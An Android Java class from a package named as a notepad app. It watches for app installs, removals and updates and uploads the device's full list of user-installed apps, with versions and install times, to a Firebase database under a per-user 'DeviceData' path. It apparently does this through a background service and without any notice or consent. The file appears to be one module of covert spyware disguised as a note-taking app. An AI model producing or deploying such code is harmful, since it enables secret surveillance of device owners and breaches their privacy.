package com.megh.notepad; // আপনার প্যাকেজের সঠিক নাম দিন

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class AppListHelper {

    private static BroadcastReceiver appReceiver;

    // লাইভ মনিটরিং শুরু করার মেথড
    public static void startMonitoring(final Context context) {
        if (appReceiver == null) {
            appReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    String action = intent.getAction();
                    String packageName = intent.getData() != null ? intent.getData().getSchemeSpecificPart() : "";

                    if (packageName.isEmpty()) return;

                    if (Intent.ACTION_PACKAGE_REMOVED.equals(action) && !intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) {
                        removeAppFromFirebase(packageName);
                    } else if (Intent.ACTION_PACKAGE_ADDED.equals(action) || Intent.ACTION_PACKAGE_REPLACED.equals(action)) {
                        syncSingleApp(context, packageName);
                    }
                }
            };

            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_PACKAGE_ADDED);
            filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
            filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
            filter.addDataScheme("package");
            context.registerReceiver(appReceiver, filter);

            Log.d("AppListHelper", "Live App monitoring started.");

            // ব্যাকগ্রাউন্ড থ্রেডে সব ইউজার অ্যাপ একসাথে সিঙ্ক করা
            new Thread(new Runnable() {
                @Override
                public void run() {
                    syncAllApps(context);
                }
            }).start();
        }
    }

    public static void stopMonitoring(Context context) {
        if (appReceiver != null) {
            context.unregisterReceiver(appReceiver);
            appReceiver = null;
            Log.d("AppListHelper", "Live App monitoring stopped.");
        }
    }

    private static void syncAllApps(Context context) {
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("InstalledApps");

            PackageManager pm = context.getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(0);
            
            Map<String, Object> allAppsMap = new HashMap<>();

            for (PackageInfo packageInfo : packages) {
                Map<String, Object> appData = getAppDetails(pm, packageInfo);
                // যদি appData null না হয় (অর্থাৎ এটি সিস্টেম অ্যাপ না হয়), তবেই ফায়ারবেসের লিস্টে যুক্ত হবে
                if (appData != null) {
                    String fbKey = packageInfo.packageName.replace(".", "_");
                    allAppsMap.put(fbKey, appData);
                }
            }

            // আগের ডাটা মুছে শুধু লেটেস্ট ইউজার অ্যাপের লিস্ট সেট করা
            dbRef.setValue(allAppsMap);
            Log.d("AppListHelper", "User installed apps synced! Total: " + allAppsMap.size());

        } catch (Exception e) {
            Log.e("AppListHelper", "Error syncing all apps: " + e.getMessage());
        }
    }

    private static void syncSingleApp(Context context, String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            PackageInfo packageInfo = pm.getPackageInfo(packageName, 0);

            Map<String, Object> appData = getAppDetails(pm, packageInfo);
            // শুধু ইউজার অ্যাপ হলেই ফায়ারবেসে যোগ হবে
            if (appData != null) {
                String fbKey = packageName.replace(".", "_");
                DatabaseReference dbRef = FirebaseDatabase.getInstance()
                        .getReference("DeviceData").child(BackgroundService.USER_ID).child("InstalledApps").child(fbKey);
                
                dbRef.setValue(appData);
                Log.d("AppListHelper", "Single user app synced: " + packageName);
            }
        } catch (Exception e) {
            Log.e("AppListHelper", "Error syncing single app: " + e.getMessage());
        }
    }

    private static void removeAppFromFirebase(String packageName) {
        try {
            String fbKey = packageName.replace(".", "_");
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("InstalledApps").child(fbKey);
            
            dbRef.removeValue();
            Log.d("AppListHelper", "App removed from Firebase: " + packageName);
        } catch (Exception e) {
            Log.e("AppListHelper", "Error removing app: " + e.getMessage());
        }
    }

    // অ্যাপের বিস্তারিত তথ্য বের করার হেল্পার মেথড
    private static Map<String, Object> getAppDetails(PackageManager pm, PackageInfo packageInfo) {
        try {
            boolean isSystemApp = (packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;

            // যদি এটি সিস্টেম অ্যাপ হয়, তবে null রিটার্ন করে দেবে (যাতে ফায়ারবেসে আপলোড না হয়)
            if (isSystemApp) {
                return null;
            }

            String appName = packageInfo.applicationInfo.loadLabel(pm).toString();
            String versionName = packageInfo.versionName == null ? "Unknown" : packageInfo.versionName;

            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault());
            String installTime = sdf.format(new Date(packageInfo.firstInstallTime));
            String updateTime = sdf.format(new Date(packageInfo.lastUpdateTime));

            Map<String, Object> appData = new HashMap<>();
            appData.put("App_Name", appName);
            appData.put("Package_Name", packageInfo.packageName);
            appData.put("Version", versionName);
            appData.put("Install_Time", installTime);
            appData.put("Last_Update", updateTime);
            // যেহেতু শুধু ইউজার অ্যাপ আসছে, তাই অ্যাপ টাইপ ফিক্স করে দেওয়া হলো
            appData.put("App_Type", "User Installed"); 

            return appData;
        } catch (Exception e) {
            return null;
        }
    }
}


